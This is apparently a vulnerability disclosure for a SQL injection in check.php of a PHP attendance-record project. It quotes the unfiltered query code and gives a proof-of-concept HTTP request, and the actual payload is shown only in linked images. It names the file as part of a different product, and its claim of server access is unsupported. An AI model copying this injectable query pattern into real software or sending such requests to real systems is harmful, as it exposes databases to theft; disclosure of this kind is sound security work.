# Simple Attendance Record System

## supplier 
https://code-projects.org/simple-attendance-record-system-in-php-with-source-code/
## Vulnerability file
check.php

## describe

**Code analysis**   

In the check.php file of Question Paper Generator, the student parameter is obtained, and the SQL statement is concatenated to the SQL statement without filtering the execution, resulting in SQL injection vulnerabilities and server permissions

Line 2-10 in check.php

```php
	require_once 'admin/connect.php';
	$student = $_POST['student'];
	$q_student = $conn->query("SELECT * FROM `student` WHERE `student_no` = '$student'") or die(mysqli_error());
	$v_student = $q_student->num_rows;
	if($v_student > 0){
		echo 'Success';
	}else{
		echo 'Error';
	}
```

## POC

```
POST /attend/SimpleAttendanceRecord/check.php HTTP/1.1
Host: 127.0.0.1:8083
Content-Length: 9
sec-ch-ua: 
Accept: */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36
sec-ch-ua-platform: ""
Origin: http://127.0.0.1:8083
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1:8083/attend/SimpleAttendanceRecord/?
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

student=1
```

**Result**
![image-2025](https://github.com/asd1238525/cve/blob/main/aa68ae70-5066-4623-8a2a-e6b44f668115.png)
Get payload:
![image-2025](https://github.com/asd1238525/cve/blob/main/cd80e53b-c937-422d-b089-a0010fe8bef2.png)